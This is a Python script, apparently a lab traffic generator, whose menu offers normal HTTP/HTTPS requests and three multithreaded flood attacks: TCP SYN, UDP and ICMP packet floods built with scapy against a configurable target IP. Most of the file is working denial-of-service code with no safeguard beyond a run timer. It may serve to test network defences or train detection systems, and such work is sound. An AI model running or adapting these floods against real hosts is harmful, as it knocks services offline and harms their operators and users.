import signal
import sys
import time
import threading
import requests
from scapy.all import send, IP, TCP, UDP, ICMP, RandShort

# Configuration
TARGET_IP = '172.17.162.128'  # Change this to the IP you want to test against
TARGET_PORT_HTTP = 80
TARGET_PORT_HTTPS = 443
NUM_REQUESTS = 1000
DELAY_BETWEEN_REQUESTS = 0.001  # Reduced delay to increase traffic rate
RUN_DURATION = 60  # Run duration in seconds
NUM_THREADS = 10  # Increased number of threads to boost traffic generation

stop_flag = threading.Event()

def signal_handler(sig, frame):
    print('Stopping traffic generation...')
    stop_flag.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def simulate_normal_traffic():
    def send_http_requests():
        end_time = time.time() + RUN_DURATION
        while time.time() < end_time and not stop_flag.is_set():
            try:
                requests.get(f'http://{TARGET_IP}:{TARGET_PORT_HTTP}')
            except requests.RequestException:
                pass

    def send_https_requests():
        end_time = time.time() + RUN_DURATION
        while time.time() < end_time and not stop_flag.is_set():
            try:
                requests.get(f'https://{TARGET_IP}:{TARGET_PORT_HTTPS}', verify=False)
            except requests.RequestException:
                pass

    threads = []
    for _ in range(NUM_THREADS // 2):
        threads.append(threading.Thread(target=send_http_requests))
        threads.append(threading.Thread(target=send_https_requests))

    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()

# Function to simulate TCP SYN Flood attack
def simulate_tcp_syn_flood():
    def send_syn_packets():
        end_time = time.time() + RUN_DURATION
        while time.time() < end_time and not stop_flag.is_set():
            packet = IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT_HTTP, flags='S')
            send(packet, verbose=False)
    
    threads = [threading.Thread(target=send_syn_packets) for _ in range(NUM_THREADS)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

# Function to simulate UDP Flood attack
def simulate_udp_flood():
    def send_udp_packets():
        end_time = time.time() + RUN_DURATION
        while time.time() < end_time and not stop_flag.is_set():
            packet = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_HTTP)
            send(packet, verbose=False)
    
    threads = [threading.Thread(target=send_udp_packets) for _ in range(NUM_THREADS)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

# Function to simulate ICMP Flood attack
def simulate_icmp_flood():
    def send_icmp_packets():
        end_time = time.time() + RUN_DURATION
        while time.time() < end_time and not stop_flag.is_set():
            packet = IP(dst=TARGET_IP) / ICMP()
            send(packet, verbose=False)
    
    threads = [threading.Thread(target=send_icmp_packets) for _ in range(NUM_THREADS)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

# Main menu
def main():
    while True:
        print("Traffic Generator")
        print("1. Generate Normal Business Traffic")
        print("2. Generate TCP SYN Flood Attack")
        print("3. Generate UDP Flood Attack")
        print("4. Generate ICMP Flood Attack")
        print("5. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            print("Generating normal business traffic...")
            simulate_normal_traffic()
        elif choice == '2':
            print("Generating TCP SYN flood attack...")
            simulate_tcp_syn_flood()
        elif choice == '3':
            print("Generating UDP flood attack...")
            simulate_udp_flood()
        elif choice == '4':
            print("Generating ICMP flood attack...")
            simulate_icmp_flood()
        elif choice == '5':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()